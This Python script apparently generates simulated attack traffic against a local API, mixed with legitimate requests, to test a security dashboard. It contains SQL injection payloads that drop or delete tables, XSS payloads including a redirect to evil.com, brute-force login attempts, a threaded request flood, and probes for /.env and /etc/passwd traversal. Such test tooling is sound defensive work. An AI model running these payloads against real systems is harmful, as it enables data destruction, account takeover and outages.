"""
Attack Simulation Script
Simulate various attack scenarios to test the security system
"""

import requests
import os
from dotenv import load_dotenv

load_dotenv("env")
import time
import random
import threading
from concurrent.futures import ThreadPoolExecutor
import json

class AttackSimulator:
    """Simulate various types of attacks against the API"""
    
    def __init__(self, base_url=None):
        self.base_url = base_url or os.getenv("API_URL", "http://localhost:5000")
        self.session = requests.Session()
        
    def sql_injection_attacks(self, num_attacks=10):
        """Simulate SQL injection attacks"""
        print(f"Simulating {num_attacks} SQL injection attacks...")
        
        sql_payloads = [
            "1' OR '1'='1",
            "'; DROP TABLE users; --",
            "1' UNION SELECT * FROM information_schema.tables --",
            "admin'--",
            "1' OR 1=1#",
            "' OR 'a'='a",
            "1'; DELETE FROM users WHERE 't'='t",
            "1' AND (SELECT COUNT(*) FROM users) > 0 --",
            "' UNION SELECT username, password FROM admin --",
            "1' OR SLEEP(5) --"
        ]
        
        for i in range(num_attacks):
            payload = random.choice(sql_payloads)
            
            # Try different attack vectors
            attack_vectors = [
                {'url': f"{self.base_url}/api/users", 'params': {'id': payload}},
                {'url': f"{self.base_url}/api/data", 'json': {'query': payload}},
                {'url': f"{self.base_url}/api/login", 'json': {'username': payload, 'password': 'test'}}
            ]
            
            vector = random.choice(attack_vectors)
            
            try:
                if 'params' in vector:
                    response = self.session.get(vector['url'], params=vector['params'])
                else:
                    response = self.session.post(vector['url'], json=vector['json'])
                
                print(f"SQL Injection {i+1}: {response.status_code} - {payload[:30]}...")
                
            except Exception as e:
                print(f"Error in SQL injection attack {i+1}: {e}")
            
            time.sleep(0.1)  # Small delay between attacks
    
    def xss_attacks(self, num_attacks=10):
        """Simulate XSS attacks"""
        print(f"Simulating {num_attacks} XSS attacks...")
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert('XSS')",
            "<svg onload=alert(1)>",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "<script>document.cookie='stolen'</script>",
            "';alert(String.fromCharCode(88,83,83))//';",
            "<script>window.location='http://evil.com'</script>",
            "<object data='javascript:alert(1)'>"
        ]
        
        for i in range(num_attacks):
            payload = random.choice(xss_payloads)
            
            attack_data = {
                'name': payload,
                'message': f"Normal message with {payload}",
                'comment': payload
            }
            
            try:
                response = self.session.post(f"{self.base_url}/api/data", json=attack_data)
                print(f"XSS Attack {i+1}: {response.status_code} - {payload[:30]}...")
                
            except Exception as e:
                print(f"Error in XSS attack {i+1}: {e}")
            
            time.sleep(0.1)
    
    def dos_attacks(self, num_threads=10, requests_per_thread=20):
        """Simulate DoS attacks with high request rate"""
        print(f"Simulating DoS attack: {num_threads} threads, {requests_per_thread} requests each...")
        
        def dos_worker():
            """Worker function for DoS attack"""
            for i in range(requests_per_thread):
                try:
                    # Mix of different endpoints
                    endpoints = ['/api/health', '/api/users', '/api/data']
                    endpoint = random.choice(endpoints)
                    
                    if endpoint == '/api/data':
                        response = self.session.post(
                            f"{self.base_url}{endpoint}",
                            json={'data': f'dos_test_{i}'}
                        )
                    else:
                        response = self.session.get(f"{self.base_url}{endpoint}")
                    
                    if i % 10 == 0:
                        print(f"DoS request: {response.status_code}")
                        
                except Exception as e:
                    print(f"DoS request failed: {e}")
        
        # Launch threads
        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            futures = [executor.submit(dos_worker) for _ in range(num_threads)]
            
            # Wait for completion
            for future in futures:
                future.result()
    
    def brute_force_login(self, num_attempts=20):
        """Simulate brute force login attacks"""
        print(f"Simulating {num_attempts} brute force login attempts...")
        
        usernames = ['admin', 'user', 'root', 'administrator', 'test']
        passwords = ['password', '123456', 'admin', 'qwerty', 'password123', 'letmein']
        
        for i in range(num_attempts):
            username = random.choice(usernames)
            password = random.choice(passwords)
            
            login_data = {
                'username': username,
                'password': password
            }
            
            try:
                response = self.session.post(f"{self.base_url}/api/login", json=login_data)
                print(f"Login attempt {i+1}: {response.status_code} - {username}:{password}")
                
            except Exception as e:
                print(f"Error in login attempt {i+1}: {e}")
            
            time.sleep(0.2)
    
    def scanner_simulation(self, num_scans=15):
        """Simulate vulnerability scanner behavior"""
        print(f"Simulating vulnerability scanner with {num_scans} scans...")
        
        scan_paths = [
            '/admin',
            '/admin.php',
            '/wp-admin',
            '/phpmyadmin',
            '/config.php',
            '/backup.sql',
            '/test.php',
            '/.env',
            '/robots.txt',
            '/sitemap.xml',
            '/api/admin',
            '/api/config',
            '/api/debug',
            '/api/../../../etc/passwd',
            '/api/users/../../admin'
        ]
        
        for i in range(num_scans):
            path = random.choice(scan_paths)
            
            try:
                response = self.session.get(f"{self.base_url}{path}")
                print(f"Scanner probe {i+1}: {response.status_code} - {path}")
                
            except Exception as e:
                print(f"Error in scanner probe {i+1}: {e}")
            
            time.sleep(0.1)
    
    def mixed_attack_simulation(self, duration_seconds=60):
        """Run mixed attacks for a specified duration"""
        print(f"Running mixed attack simulation for {duration_seconds} seconds...")
        
        start_time = time.time()
        attack_count = 0
        
        while time.time() - start_time < duration_seconds:
            attack_type = random.choice([
                'sql_injection', 'xss', 'brute_force', 'scanner'
            ])
            
            try:
                if attack_type == 'sql_injection':
                    self.sql_injection_attacks(1)
                elif attack_type == 'xss':
                    self.xss_attacks(1)
                elif attack_type == 'brute_force':
                    self.brute_force_login(1)
                elif attack_type == 'scanner':
                    self.scanner_simulation(1)
                
                attack_count += 1
                
            except Exception as e:
                print(f"Error in {attack_type} attack: {e}")
            
            time.sleep(random.uniform(0.1, 0.5))
        
        print(f"Mixed attack simulation completed. Total attacks: {attack_count}")
    
    def legitimate_traffic(self, num_requests=50, dashboard_url=None):
        dashboard_url = dashboard_url or os.getenv("DASHBOARD_URL", "http://localhost:8070")
        """Generate legitimate traffic and log it to the dashboard."""
        print(f"Generating {num_requests} legitimate requests...")

        for i in range(num_requests):
            try:
                # Mix of legitimate requests
                if i % 4 == 0:
                    response = self.session.get(f"{self.base_url}/api/health")
                    endpoint = "/api/health"
                    method   = "GET"
                elif i % 4 == 1:
                    response = self.session.get(f"{self.base_url}/api/users")
                    endpoint = "/api/users"
                    method   = "GET"
                elif i % 4 == 2:
                    legitimate_data = {
                        'name':    f'User{i}',
                        'email':   f'user{i}@example.com',
                        'message': f'This is a legitimate message {i}'
                    }
                    response = self.session.post(f"{self.base_url}/api/data", json=legitimate_data)
                    endpoint = "/api/data"
                    method   = "POST"
                else:
                    login_data = {'username': 'admin', 'password': 'secure123'}
                    response = self.session.post(f"{self.base_url}/api/login", json=login_data)
                    endpoint = "/api/login"
                    method   = "POST"

                # Log the clean request to the dashboard
                try:
                    requests.post(f"{dashboard_url}/api/dashboard/clean-request", json={
                        'ip':       '127.0.0.1',
                        'endpoint': endpoint,
                        'method':   method,
                    }, timeout=2)
                except Exception:
                    pass  # Don't break simulation if dashboard is unreachable

                if i % 10 == 0:
                    print(f"Legitimate request {i+1}: {response.status_code}")

            except Exception as e:
                print(f"Error in legitimate request {i+1}: {e}")

            time.sleep(random.uniform(0.2, 1.0))

def main():
    """Main function to run attack simulations"""
    print("API Security Attack Simulator")
    print("=" * 40)
    
    simulator = AttackSimulator()
    
    # Check if API is running
    try:
        response = simulator.session.get(f"{simulator.base_url}/health")
        if response.status_code != 200:
            print("API is not running. Please start the application first.")
            return
    except Exception:
        print("Cannot connect to API. Please start the application first.")
        return
    
    print("API is running. Starting continuous, realistic simulation (Press Ctrl+C to stop)...\n")
    
    actions = [
        ('legitimate', 50),   # 50% chance of legitimate traffic
        ('sql_injection', 10),# 10% chance
        ('xss', 15),          # 15% chance
        ('brute_force', 10),  # 10% chance
        ('scanner', 10),      # 10% chance
        ('dos', 5)            # 5% chance
    ]
    
    try:
        while True:
            # Weighted random choice
            total_weight = sum(weight for item, weight in actions)
            r = random.uniform(0, total_weight)
            upto = 0
            chosen_action = 'legitimate'
            for item, weight in actions:
                if upto + weight >= r:
                    chosen_action = item
                    break
                upto += weight
                
            if chosen_action == 'legitimate':
                simulator.legitimate_traffic(random.randint(1, 4))
            elif chosen_action == 'sql_injection':
                simulator.sql_injection_attacks(random.randint(1, 2))
            elif chosen_action == 'xss':
                simulator.xss_attacks(random.randint(1, 2))
            elif chosen_action == 'brute_force':
                simulator.brute_force_login(random.randint(3, 8))
            elif chosen_action == 'scanner':
                simulator.scanner_simulation(random.randint(2, 5))
            elif chosen_action == 'dos':
                print("Simulating swift DoS burst...")
                simulator.dos_attacks(num_threads=3, requests_per_thread=8)
            
            # Wait a realistic amount of time before the next random action 
            # (between 2 to 7 seconds)
            delay = random.uniform(2.0, 7.0)
            print(f"-> Waiting {delay:.1f}s until next event...\n")
            time.sleep(delay)
            
    except KeyboardInterrupt:
        print("\nSimulation stopped by user.")

if __name__ == "__main__":
    main()